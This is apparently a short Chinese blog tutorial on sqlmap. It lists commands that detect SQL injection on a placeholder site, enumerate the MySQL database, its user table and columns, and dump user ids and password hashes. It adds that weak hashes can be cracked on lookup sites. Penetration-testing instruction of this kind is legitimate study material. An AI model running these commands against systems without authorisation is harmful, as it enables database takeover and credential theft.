title: sqlmap的简单应用
date: 2016-05-08 11:50:24
tags:
---

引用下官方介绍：sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. 即sqlmap是个开源的测试工具，能自动检测和利用SQL注入漏洞。
本文以获取 DBMS 用户和密码 hash 为例，简单介绍下sqlmap的使用。
sqlmap的使用很简单，其命令选项被归类为目标（Target）选项、请求（Request）选项、优化、注入、检测、技巧（Techniques）、指纹、枚举等。使用如下命令可获取帮助
>python sqlmap.py -h

当你发现疑似可以注入的地方时，使用 -u 参数指定注入页面，如果需以 post 方式注入，可使用 --data 参数，用法如下：
>sqlmap.py -u "http://example.xxx/1.php?id=2&pw=3"  (get方式)

>sqlmap.py -u "http://example.xxx/1.php" --data "id=2&pw=3"  (post方式)

如果可以注入，sqlmap 会给出数据库的相关信息提示。
接下来就该列出 DBMS 数据库了，使用 --dbs 参数：
>sqlmap.py -u "http://example.xxx/1.php" --data "id=2&pw=3"  --dbs

等了一会，枚举完成，根据这过程中的相关提示我们知道目标为运行在 Ubuntu 上的 MySQL ，所以我们的目标是“mysql”这个数据库。
然后需要列出 mysql 数据库中有哪些表，使用 -D 指定数据库，--tables 枚举表：
>sqlmap.py -u "http://example.xxx/1.php" --data "id=2&pw=3"  -D mysql --tables

在结果中有 user 这个表，根据猜想这个表里应该有用户名和密码，下一步枚举这个表中的列，使用 -T 指定表 --columns 枚举列：
>sqlmap.py -u "http://example.xxx/1.php" --data "id=2&pw=3"  -D mysql -T user --columns

结果有好多，其中有 id 和 password 等列，印证了我们的猜想。
最后一步便是把用户名和密码 dump 出来，使用 -C 指定列，使用 --dump 来 dump：
>sqlmap.py -u "http://example.xxx/1.php" --data "id=2&pw=3"  -D mysql -T user -C id,password --dump

经过一番等待之后，结果便出来了。

如果是原始密码弱密码的话，可以轻易在一些解密网站上查得到原始密码。

